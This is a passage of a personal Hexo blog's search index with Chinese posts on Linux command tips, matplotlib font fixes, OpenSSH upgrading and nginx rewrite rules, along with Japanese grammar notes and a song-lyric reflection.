class="string">&#x27;*.jpg&#x27;</span> -<span class="built_in">exec</span> convert -resize 1100x2200 &#123;&#125; &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="二十一、五-弄一个读取速度很快很快的小硬盘"><a href="#二十一、五-弄一个读取速度很快很快的小硬盘" class="headerlink" title="二十一、五 弄一个读取速度很快很快的小硬盘"></a>二十一、五 弄一个读取速度很快很快的小硬盘</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/ram</span><br><span class="line">mount -t tmpfs tmpfs /mnt/ram -o size=8192M</span><br></pre></td></tr></table></figure><h4 id="二十二、don’t-add-command-to-history-note-the-leading-space"><a href="#二十二、don’t-add-command-to-history-note-the-leading-space" class="headerlink" title="二十二、don’t add command to history (note the leading space)"></a>二十二、don’t add command to history (note the leading space)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Am I like a hacker?&quot;</span><br></pre></td></tr></table></figure><h4 id="二十三、exit-terminal-but-leave-all-processes-running"><a href="#二十三、exit-terminal-but-leave-all-processes-running" class="headerlink" title="二十三、exit terminal but leave all processes running"></a>二十三、exit terminal but leave all processes running</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">disown</span> -a &amp;&amp; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h4 id="二十四、script-回放"><a href="#二十四、script-回放" class="headerlink" title="二十四、script 回放"></a>二十四、script 回放</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始录像，ctrl+d或者exit结束</span></span><br><span class="line">script -t 2&gt;demo.time -a demo.his</span><br><span class="line"><span class="comment"># 回放</span></span><br><span class="line">scriptreplay demo.time demo.his</span><br></pre></td></tr></table></figure><h4 id="二十五、-搜索历史记录"><a href="#二十五、-搜索历史记录" class="headerlink" title="二十五、 搜索历史记录"></a>二十五、 搜索历史记录</h4><p>ctrl + r<br>我天，这么好用的命令我居然一直很少用。。。</p><h4 id="二十六、-V2ray"><a href="#二十六、-V2ray" class="headerlink" title="二十六、 V2ray"></a>二十六、 V2ray</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统时间</span></span><br><span class="line">sudo date -s 2019/10/27</span><br><span class="line">sudo date -s 16:36:10</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">sudo pacman -S openntpd</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> openntpd</span><br><span class="line">sudo systemctl start openntpd</span><br></pre></td></tr></table></figure><h4 id="二十七、archlinux-vmware"><a href="#二十七、archlinux-vmware" class="headerlink" title="二十七、archlinux vmware"></a>二十七、archlinux vmware</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次更新完内核都要使用如下命令重新编译内核模块的</span></span><br><span class="line">sudo vmware-modconfig --console --install-all</span><br></pre></td></tr></table></figure><h4 id="二十八、linux写入-ntfs-文件"><a href="#二十八、linux写入-ntfs-文件" class="headerlink" title="二十八、linux写入 ntfs 文件"></a>二十八、linux写入 ntfs 文件</h4><p>需要安装 ntfs-3g</p><h4 id="二十九、sudo-git-导致root用户和其他用户git配置不一致"><a href="#二十九、sudo-git-导致root用户和其他用户git配置不一致" class="headerlink" title="二十九、sudo git 导致root用户和其他用户git配置不一致"></a>二十九、sudo git 导致root用户和其他用户git配置不一致</h4><p>sudo 也不是乱用的晕。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*** Please tell me who you are.</span><br><span class="line"></span><br><span class="line">Run</span><br><span class="line"></span><br><span class="line">  git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">  git config --global user.name &quot;Your Name&quot;</span><br><span class="line"></span><br><span class="line">to set your account&#x27;s default identity.</span><br><span class="line">Omit --global to set the identity only in this repository.</span><br><span class="line"></span><br><span class="line">fatal: unable to auto-detect email address (got &#x27;root@****.(none)&#x27;)</span><br></pre></td></tr></table></figure><h4 id="三十、-archlinux-中一个网卡多ip可能会导致不同服务ip冲突导致网速下降"><a href="#三十、-archlinux-中一个网卡多ip可能会导致不同服务ip冲突导致网速下降" class="headerlink" title="三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降"></a>三十、 archlinux 中一个网卡多ip可能会导致不同服务ip冲突导致网速下降</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看一个网卡是否存在多个ip</span></span><br><span class="line">ip addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果存在多个 ip 可能是系统装有多个网络管理造成的, 我是把 dhcpcd 关了 再 配合静态ip就好了</span></span><br><span class="line">systemctl stop dhcpcd</span><br><span class="line">systemctl <span class="built_in">disable</span> dhcpcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后重启</span></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure><h4 id="三十一、-linux-下-pycharm-用-matplotlib-库中文乱码-及-减号方块问题"><a href="#三十一、-linux-下-pycharm-用-matplotlib-库中文乱码-及-减号方块问题" class="headerlink" title="三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题"></a>三十一、 linux 下 pycharm 用 matplotlib 库中文乱码 及 减号方块问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 matplotlib 字体及配置文件目录</span></span><br><span class="line"><span class="keyword">import</span> matplotlib </span><br><span class="line">CONFIG_DIR = <span class="built_in">print</span>(matplotlib.matplotlib_fname())</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://fontzone.net/download/simhei 下载 simhei 字体</span></span><br><span class="line"><span class="comment"># 把字体拷贝到 matplotlib 字体目录</span></span><br><span class="line"><span class="comment"># 要注意你新下载字体的用户及用户组的权限和该目录下一致</span></span><br><span class="line">cp DOWNLOAD_DIR/simhei.ttf CONFIG_DIR/fonts/ttf/ </span><br><span class="line">vim CONFIG_DIR/matplotlibrc <span class="comment"># matplotlib 配置文件目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到相应位置并 修改为下面三项</span></span><br><span class="line">font.family : sans-serif</span><br><span class="line">font.sans-serif     : SimHei, Bitstream Vera Sans, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif</span><br><span class="line">axes.unicode_minus:False <span class="comment">#作用就是解决负号&#x27;-&#x27;显示为方块的问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除原本字体缓存</span></span><br><span class="line"><span class="built_in">cd</span> ~/.cache/matplotlib</span><br><span class="line">rm -rf *.*</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 应该就 OK 了</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「助詞」</title>
      <link href="//p/2019/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/"/>
      <url>//p/2019/%E3%80%8C%E5%8A%A9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="助詞「は」"><a href="#助詞「は」" class="headerlink" title="助詞「は」"></a>助詞「は」</h3><h4 id="l—-主語は-一个句子只能有一个"><a href="#l—-主語は-一个句子只能有一个" class="headerlink" title="l— 主語は　一个句子只能有一个"></a>l<sub>— 主語は　一个句子只能有一个</h4><h4 id="l—-表示区别对比"><a href="#l—-表示区别对比" class="headerlink" title="l— 表示区别对比"></a>l<sub>— 表示区别对比</h4><p>例：明日は働きません<br>　　私は野菜と魚を食べます。肉は食べません<br>　　[私は]土曜日は友達と食事します。日曜日は働きます</p><h3 id="助詞「に」"><a href="#助詞「に」" class="headerlink" title="助詞「に」"></a>助詞「に」</h3><h4 id="l—-表示動作進行時点"><a href="#l—-表示動作進行時点" class="headerlink" title="l— 表示動作進行時点"></a>l<sub>— 表示動作進行時点</h4><ul><li><p>具体时间要放「に」（八時に、午後四時に）〜　ます<br>例：１０時に友達と食事します。</p></li><li><p>泛指时间不用放「に」（明日）〜　ます</p></li><li><p>可放可不放「に」月曜日　火曜日　水曜日　木曜日　金曜日　土曜日　日曜日　</p></li></ul><h4 id="l—-表示存在位置"><a href="#l—-表示存在位置" class="headerlink" title="l— 表示存在位置"></a>l<sub>— 表示存在位置</h4><ul><li><p>重点是 <strong>东西或人/动物</strong></p><ul><li>存在位置 + に + <strong>东西</strong> + が <u>あり</u>ます<br>例：机の上にリンゴが<u>あり</u>ます<br>  a：京都に何が<u>あり</u>ます<br>  b：古いお寺や神社[など]が <u>あり</u>ます</li><li>存在位置 + に + <strong>人/动物</strong> + が <u>い</u>ます<br>例：あそこに子供が<u>い</u>ます<br>  a：部屋に誰が<u>い</u>ます<br>  b：田中さんが<u>い</u>ます</li></ul></li><li><p>重点是 <strong>位置</strong></p><ul><li>东西 + は + <strong>存在位置</strong> + に + が <u>あり</u>ます<br>例：a：トイレはどこに<u>あり</u>ますか<br>&emsp;&emsp;b：2階に<u>あり</u>ます/2階です</li><li>人/动物 + は + <strong>存在位置</strong> + に + が <u>い</u>ます<br>例：a：田中さんはどこに<u>い</u>ますか<br>&emsp;&emsp;b：＿＿＿＿＿会議室に<u>い</u>ます</li></ul></li></ul><h4 id="l—-当动作一个人完成不了时"><a href="#l—-当动作一个人完成不了时" class="headerlink" title="l— 当动作一个人完成不了时"></a>l<sub>— 当动作一个人完成不了时</h4><p>动作主 + は + 动作对方 + に +动作对象 + を + 动词<br>例：私は友達に電話を掛けました<br>&emsp;&emsp;[私は]友達にCDを貸しました<br>&emsp;&emsp;私はFAXで会社にレポートを送りました</p><p>例：私は母にカードをあげました<br>&emsp;&emsp;私は母にセーターを<u>貰いました</u>  收到<br>&emsp;&emsp;母は私にセーターを<u>くれました</u>  给(我)<br>&emsp;&emsp;<u>×</u> 母は私にセーターを<u>あげました</u><br>&emsp;&emsp;因为日本人比较谦虚, 给别人的时候要 「上げ」, 就是比较熟的人也是如此, 别人给我时是 「クレ」<br>&emsp;&emsp;例：友達は私の妹に本をくれました<br>&emsp;&emsp;&emsp;&emsp;私は父にネクタイをあげました</p><h4 id="l—-表示分配時間"><a href="#l—-表示分配時間" class="headerlink" title="l— 表示分配時間"></a>l<sub>— 表示分配時間</h4><p>期間 + に + 次数</p><p>例：一週間に２回日本語を勉強します<br>a：一周間に何回英語を勉強しますか<br>b：4回勉強します。1回に4時間勉強します<br>a：じゃあ、一週間に１６時間ですね。すごいですね</p><h3 id="助詞「で」"><a href="#助詞「で」" class="headerlink" title="助詞「で」"></a>助詞「で」</h3><h4 id="l—-表示動作進行地点"><a href="#l—-表示動作進行地点" class="headerlink" title="l— 表示動作進行地点"></a>l<sub>— 表示動作進行地点</h4><ul><li><p>場所 + で + 動詞　〜　ます<br>在…<br>例：駅の前で会いましょう。</p></li><li><p>一个人做什么什么<br>一人で</p></li><li><p>表示交通工具（搭乘～，开～，骑～， 坐～）<br>例：電車で行きます<br>　　要搭电车去</p></li></ul><h4 id="l—-用…工具-方法"><a href="#l—-用…工具-方法" class="headerlink" title="l— 用…工具(方法)"></a>l<sub>— 用…工具(方法)</h4><p>例：私は<u>FAXで</u>会社にレポートを送りました</p><h3 id="助詞「と」"><a href="#助詞「と」" class="headerlink" title="助詞「と」"></a>助詞「と」</h3><h4 id="l—-和（跟）…"><a href="#l—-和（跟）…" class="headerlink" title="l— 和（跟）…"></a>l<sub>— 和（跟）…</h4><p>例：日曜日、[あなたは]誰と食事しますか。<br>　　[私は]高校時代の友達と食事します。</p><h4 id="l—-表并列-和"><a href="#l—-表并列-和" class="headerlink" title="l— 表并列 和"></a>l<sub>— 表并列 和</h4><ul><li>机の上に本とノートがあります<br>  表示桌子上只有书和备忘录</li><li>机の上に本やノート[など(等)]があります<br>  表示桌子上有书、备忘录等</li></ul><h3 id="助詞「を」"><a href="#助詞「を」" class="headerlink" title="助詞「を」"></a>助詞「を」</h3><ul><li>表示动作作用对象(看得见的动作)　<br>対象 + を + 動作<br>例：日本語を勉強します</li></ul><h3 id="助詞「が」"><a href="#助詞「が」" class="headerlink" title="助詞「が」"></a>助詞「が」</h3><ul><li>対象 + が（表示焦点）+ 状態動詞　<br>例：日本語が分かります<br>&emsp;&emsp;私はお金が全然ありません</li></ul><h3 id="時制"><a href="#時制" class="headerlink" title="時制"></a>時制</h3><table><thead><tr><th align="center">-</th><th align="center">肯定</th><th align="center">否定</th></tr></thead><tbody><tr><td align="center">現在</td><td align="center">〜ます</td><td align="center">〜ません</td></tr><tr><td align="center">過去</td><td align="center">〜ました</td><td align="center">〜ませんでした</td></tr></tbody></table><h3 id="語気"><a href="#語気" class="headerlink" title="語気"></a>語気</h3><ul><li>ませんか<br>要不要</li></ul><p>例：一緒に[動詞]ませんか<br>&emsp;&emsp;ええ、[ ]ましょう<br>&emsp;&emsp;すみません、ちょっと…</p><h3 id="その他"><a href="#その他" class="headerlink" title="その他"></a>その他</h3><ul><li><p>歩いて<br>走路去</p></li><li><p>总是 いつも　经常 よく　有时候 時々</p></li><li><p>不常 あまり＿＿ません　完全不 全然＿＿ません</p></li><li><p>理由原因から、＿＿＿＿＿＿<br>例：お金がありませんから、どこも行きたくないです<br>&emsp;&emsp;日本のアニメが好きですから、日本語を勉強します<br>&emsp;&emsp;a：どうして、昨日、学校へ来ませんですか<br>&emsp;&emsp;b：疲れましたから</p></li><li><p>もう　已经<br>例：もう晩ご飯を食べましたか<br>&emsp;&emsp;はい、もう食べました<br>&emsp;&emsp;いいえ、まだです<br>&emsp;&emsp;20時ですね、もう帰ります<br>&emsp;&emsp;a：もうあの映画を見ましたか<br>&emsp;&emsp;b：いいえ、まだです。明日友達と見ます<br>&emsp;&emsp;a：21時ですよ、帰りませんか<br>&emsp;&emsp;b：そうですね、帰りましょう</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 7.9</title>
      <link href="//p/2019/Openssh%20upgrade,%20from%207.5%20to%207.9/"/>
      <url>//p/2019/Openssh%20upgrade,%20from%207.5%20to%207.9/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次OpenSSH升级过程"><a href="#记一次OpenSSH升级过程" class="headerlink" title="记一次OpenSSH升级过程"></a>记一次OpenSSH升级过程</h3><h3 id="系统环境-Ubuntu14-04"><a href="#系统环境-Ubuntu14-04" class="headerlink" title="系统环境: Ubuntu14.04"></a>系统环境: Ubuntu14.04</h3><ul><li><p>如果服务器并非采用云虚拟平台，最好先启用并测试SSH以外的连接方式（如Telnet）是否能够正常使用，如果SSH安装失败会连不上服务器（别问我怎么知道的…）</p></li><li><p>删除旧版本的openssh版本文件及旧版本的openssl（1、记得先备份好 2、如果zlib版本适应当前版本OpenSSH，可以不用更新）</p></li><li><p>Wget openssh7.9p1、openssl1.1.1 和 perl5.26安装包</p></li><li><p>先编译安装perl,记得备份旧的perl，再创造新的软链接<br>Perl -v进行测试</p></li><li><p>编译安装openssl，<br>openssl version测试不成功<br>到bin目录下./openssl version，报文件加载出错<br>备份并重新创建新的libssl.so.1.1和libcrypto.so.1.1软链接<br>再次bin目录下./openssl version成功<br>备份并创建新的openssl软链接<br>Openssl version进行测试</p></li><li><p>编译安装openssh</p></li><li><p>修改ssh配置文件允许root用户登录</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ゴーストルール</title>
      <link href="//p/2019/%E3%82%B3%E3%82%99%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/"/>
      <url>//p/2019/%E3%82%B3%E3%82%99%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="‘メーデー’の意味"><a href="#‘メーデー’の意味" class="headerlink" title="‘メーデー’の意味"></a>‘メーデー’の意味</h4><p>この前、ゴーストルールを聴きました、その歌詞の中　’メーデー’　があります<br>どういう意味なのか？　その意味について考えがあります。</p><p>グーグルで、このような言葉がある：<br>Mayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications.</p><p>遭難信号のことですか？<br>エエエエエ、、全然分からない</p><p>最後にこのリンクを見つけました　<a href="https://music.branchwith.com/element/interpretation/go-sutoru-ru">ゴーストルール歌詞の意味</a><br>つまり、主人公は遭難していて、だれかに見つけてもらいたいと信号を送っているのです。</p><p>そんな遭難信号を送っておきながら、僕は見つけられても抱き締めなくていいと言っています。</p><p>一方で、僕に気づいたら笑いかけて欲しいと願っています。</p><p>これは、僕が抱きしめることのできない存在だということを言っているのではないでしょうか？</p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deploy WordPress, ThinkPHP5 and general system in Nginx</title>
      <link href="//p/2019/maintence/"/>
      <url>//p/2019/maintence/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次Nginx上同时部署WordPress、-ThinkPHP5-和-普通系统，其中WordPress使用目录多站点"><a href="#记一次Nginx上同时部署WordPress、-ThinkPHP5-和-普通系统，其中WordPress使用目录多站点" class="headerlink" title="记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点"></a>记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点</h3><h5 id="这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。"><a href="#这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。" class="headerlink" title="这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。"></a>这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。</h5><ul><li>wordpress本身路由特点，wordpress在建站时会把网站的根地址存在数据库的wp_options表的siteurl、home、ossdl_off_cdn_url和ossdl_off_blog_url字段中，路由都是从数据库中读取。所以nginx无论怎么修改配置都是测试不了问题的。</li></ul><ul><li>wordpress域名多站点与目录多站点存在着不同之处，安装wp目录多站点时，必须要停用所有插件再开启。</li></ul><ul><li>wp目录多站点的重写规则，由于wp路由的特殊性，wp在nginx的配置会覆盖其他系统的配置，所以访问uri时必须首先重写其他系统的uri。又由于存在wp，tp5，以及原生系统，三种不同路由的规则，一开始服务器配置又经过许多人手，配置起来比较凌乱。</li></ul><ul><li>由于在编译安装nginx时，没有装上echo输出，在我们调试正则表达式规则重写uri时候带来了很多麻烦，需要改不同的正则表达式，然后查看log文件，站点访问情况等摸索它的重写规律。</li></ul><h4 id="以下是配置文件内容"><a href="#以下是配置文件内容" class="headerlink" title="以下是配置文件内容:"></a>以下是配置文件内容:</h4><h5 id="RoomReserver-是普通系统，tpmas是ThinkPHP5系统"><a href="#RoomReserver-是普通系统，tpmas是ThinkPHP5系统" class="headerlink" title="RoomReserver 是普通系统，tpmas是ThinkPHP5系统"></a>RoomReserver 是普通系统，tpmas是ThinkPHP5系统</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#RoomResever rewrite rule</span><br><span class="line">rewrite ^/RoomReserve/(.*)$ /RoomReserve/$1 break;</span><br><span class="line"></span><br><span class="line">#tpmas rewrite rule</span><br><span class="line">if ( $request_uri ~* /tpmas/ ) &#123;</span><br><span class="line">    rewrite  ^/tpmas/public/index.php/(.*)$ /tpmas/public/index.php?s=/$1 last; break;</span><br><span class="line">#rewrite  ^/tpmas/public/index.php/(.*)$ /tpmas/public/index.php?s=/$1 last;  break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#wordpress rewrite rule</span><br><span class="line">rewrite ^/([_0-9a-zA-Z-]+/)?wp-admin$ /$1wp-admin/ permanent;</span><br><span class="line"></span><br><span class="line">if (-f $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if (-d $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($rule_2 = &quot;1&quot;)&#123;</span><br><span class="line">#ignored: “-” thing used or unknown variable in regex/rew</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rewrite ^/([_0-9a-zA-Z-]+/)?(wp-(content|admin|includes).*) /$2 last;</span><br><span class="line">rewrite ^/([_0-9a-zA-Z-]+/)?(.*.php)$ /$2 last;</span><br><span class="line">rewrite /. /index.php last;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="//p/2019/hello-world/"/>
      <url>//p/2019/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
